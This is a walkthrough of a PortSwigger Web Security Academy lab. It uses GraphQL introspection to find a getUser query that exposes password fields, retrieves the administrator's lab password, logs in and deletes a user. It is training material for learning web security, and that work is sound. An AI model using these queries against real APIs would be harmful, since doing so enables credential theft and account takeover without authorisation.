# Lab 2: Accidental Exposure of Private GraphQL Fields

**Platform:** PortSwigger Web Security Academy

**Category:** GraphQL API Vulnerabilities (PRACTITIONER)

<img width="1005" height="183" alt="image" src="https://github.com/user-attachments/assets/c139381a-222f-4140-844c-b8657e719f86" />

## Lab Description

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos. 

## Steps

### 1. Identifying the GraphQL Endpoint

First, I inspected the application's requests using Burp Suite → Proxy → HTTP history.

I discovered that the application was using a GraphQL endpoint.

I sent the request to Burp Suite Repeater to investigate the GraphQL API further.

### 2. Performing GraphQL Introspection

Next, I used the **GraphQL extension in Burp Suite** and selected the option to set up introspection.

Alternatively, I could manually send a full GraphQL introspection query to retrieve the application's schema.

The introspection query was:

```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

The server returned the complete GraphQL schema, including the available queries, mutations, object types, and fields.



### 3. Visualizing the GraphQL Schema

To make the returned schema easier to understand and analyze, I used **GraphQL Voyager**:

[Open graphql voyager](https://apis.guru/graphql-voyager/)

I copied the introspection response from Burp Suite and pasted it into the introspection tab in GraphQL Voyager.

I discovered an interesting query:

`getUser`

It exposed the following fields:

- `id`
- `username`
- `password`


### 4. Retrieving Administrator Credentials

I inspected the `getUser` query more closely and discovered from burp response that it required an `id` argument.

I constructed the following GraphQL query to retrieve the user information:

```
query getUser {
    getUser(id: 1) {
        id
        username
        password
    }
}
```

After sending the request, the server returned:

```json
{
    "data": {
        "getUser": {
            "id": 1,
            "username": "administrator",
            "password": "yvk5y9cy6ocz15mvkghr"
        }
    }
}
```

The response revealed the administrator's username and password without requiring administrator privileges.

<img width="1145" height="412" alt="image" src="https://github.com/user-attachments/assets/1c3556b6-6f16-41ff-a22c-adfbd3b95246" />


### 5. Logging In as Administrator

After retrieving the credentials, I navigated to the login page and used the exposed administrator credentials to sign in.

I successfully accessed the administrator account and opened the admin panel.

### 6. Deleting Carlos and Solving the Lab

Finally, I located the user `carlos` in the admin panel and deleted the account.

Alhamdulillah, the lab was solved.

---

**Lab Link:** [Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
